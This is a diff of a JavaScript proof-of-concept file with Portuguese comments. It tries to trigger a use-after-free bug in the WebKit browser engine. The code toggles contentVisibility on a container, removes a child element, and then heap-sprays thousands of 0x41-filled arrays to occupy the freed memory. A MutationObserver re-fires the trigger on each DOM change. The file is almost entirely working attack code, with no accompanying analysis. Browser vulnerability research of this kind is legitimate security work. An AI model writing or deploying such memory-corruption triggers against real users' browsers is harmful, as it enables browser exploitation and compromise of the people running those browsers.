@@ -1,68 +1,79 @@
 // js/uaf_webkit_poc/poc.js
-import { debug_log } from './module/utils.mjs'; // Ajustado para o novo local
-
-const container = document.querySelector(".container"); // Ainda pega do DOM global
-const child = document.querySelector(".child");     // Ainda pega do DOM global
+import { debug_log } from './module/utils.mjs';
 
 function heapSpray() {
   let spray = [];
-  for (let i = 0; i < 10000; i++) { // Spray grande, pode causar lentidão
-    let arr = new Uint8Array(0x1000); // 4KB por array
+  for (let i = 0; i < 10000; i++) {
+    let arr = new Uint8Array(0x1000);
     for (let j = 0; j < arr.length; j++) {
-      arr[j] = 0x41; // Preenche com 'A'
+      arr[j] = 0x41;
     }
     spray.push(arr);
   }
   return spray;
 }
 
-// Exportar a função para ser usada em main.mjs
 export function triggerUAF() {
-  // Garante que os elementos sejam selecionados novamente se o DOM for modificado drasticamente
+  // Sempre busca o container no momento da chamada
   const currentContainer = document.querySelector(".container");
-  const currentChild = currentContainer ? currentContainer.querySelector(".child") : null;
 
-  if (!currentContainer || !currentChild) {
-    debug_log("Erro: Elementos .container ou .child não encontrados para UAF.");
-    console.error("Erro: Elementos .container ou .child não encontrados para UAF.");
+  if (!currentContainer) {
+    debug_log("Erro Crítico: Elemento .container não encontrado para UAF. A PoC não pode continuar.");
+    console.error("Erro Crítico: Elemento .container não encontrado para UAF.");
     return;
   }
 
-  debug_log("Tentando UAF: contentVisibility=hidden, child.remove()");
-  currentContainer.style.contentVisibility = "hidden";
-  currentChild.remove(); // << Ponto potencial de UAF: child é removido
+  // Busca o child dentro do container atual
+  const currentChild = currentContainer.querySelector(".child");
 
-  // Adia a próxima parte para permitir que o navegador processe a remoção
+  debug_log("Tentando UAF: contentVisibility=hidden...");
+  currentContainer.style.contentVisibility = "hidden";
+
+  if (currentChild) {
+    debug_log("Elemento .child encontrado, removendo-o.");
+    currentChild.remove(); // Remove o filho se ele existir
+  } else {
+    debug_log("Elemento .child já foi removido ou não encontrado inicialmente nesta chamada.");
+  }
+
+  // A lógica de UAF continua mesmo que o filho já tenha sido removido,
+  // pois o bug pode estar relacionado ao slot de memória do filho.
   setTimeout(() => {
     debug_log("Continuando UAF: contentVisibility=auto, heapSpray()");
-    currentContainer.style.contentVisibility = "auto"; // << Tenta forçar o uso da memória do child
+    // Garante que currentContainer ainda é válido (embora seja improvável que desapareça aqui)
+    if (document.body.contains(currentContainer)) {
+        currentContainer.style.contentVisibility = "auto";
+    } else {
+        debug_log("Container foi removido do DOM antes de contentVisibility='auto'.");
+        return;
+    }
     
-    let sprayArrays = heapSpray(); // Tenta preencher a memória liberada
-    
-    // Adicionado para evitar "unused variable" e manter referência, se necessário para GC
+    let sprayArrays = heapSpray();
     if(sprayArrays.length > 0) {
         debug_log(`Heap spray realizado com ${sprayArrays.length} arrays.`);
     }
-    debug_log("UAF triggered (ou pelo menos a tentativa). Verifique o console e comportamento do navegador.");
-  }, 0); // Delay de 0ms para colocar na próxima volta do event loop
+    debug_log("Tentativa de UAF concluída. Verifique o console e comportamento do navegador.");
+  }, 0);
 }
 
-// O MutationObserver pode causar múltiplas execuções se não for gerenciado com cuidado.
-// Para uma integração simples, ele pode ser removido ou ajustado para não chamar triggerUAF recursivamente
-// se a própria triggerUAF modificar o DOM de uma forma que o observer detecte.
-// Por ora, vou manter a lógica original do seu PoC.
-const initialContainer = document.querySelector(".container");
-if (initialContainer) {
-    const observer = new MutationObserver(() => {
-      debug_log("MutationObserver: DOM tree modified, re-tentando UAF...");
-      // Para evitar loops infinitos se triggerUAF modificar o DOM observado,
-      // poderia ser necessário desconectar o observer antes de chamar triggerUAF
-      // e reconectar depois, ou ter uma flag para evitar reentrância.
-      // observer.disconnect(); // Exemplo
+// Configuração do MutationObserver
+const initialContainerForObserver = document.querySelector(".container");
+if (initialContainerForObserver) {
+    const observer = new MutationObserver((mutationsList, obs) => {
+      // Logar apenas para a primeira mutação detectada pelo observer para evitar spam,
+      // ou se a intenção é re-triggerar a cada mutação, pode precisar de lógica mais complexa
+      // para não entrar em loops infinitos se o próprio triggerUAF causar mutações.
+      debug_log("MutationObserver: DOM tree modified, chamando triggerUAF...");
+      
+      // Para evitar loops se triggerUAF modificar o DOM que o observer está escutando,
+      // você pode desconectar temporariamente.
+      // obs.disconnect(); 
       triggerUAF();
-      // observer.observe(initialContainer, { childList: true, subtree: true }); // Exemplo
+      // Se desconectado, você precisaria decidir se/quando reconectar:
+      // obs.observe(initialContainerForObserver, { childList: true, subtree: true });
     });
-    observer.observe(initialContainer, { childList: true, subtree: true });
+    observer.observe(initialContainerForObserver, { childList: true, subtree: true });
 } else {
-    console.warn("Elemento .container inicial não encontrado para MutationObserver no UAF PoC.");
+    // Este log ocorreria se o .container não estivesse presente quando poc.js é carregado.
+    console.warn("Elemento .container inicial não encontrado para MutationObserver no UAF PoC no momento do carregamento do poc.js.");
 }
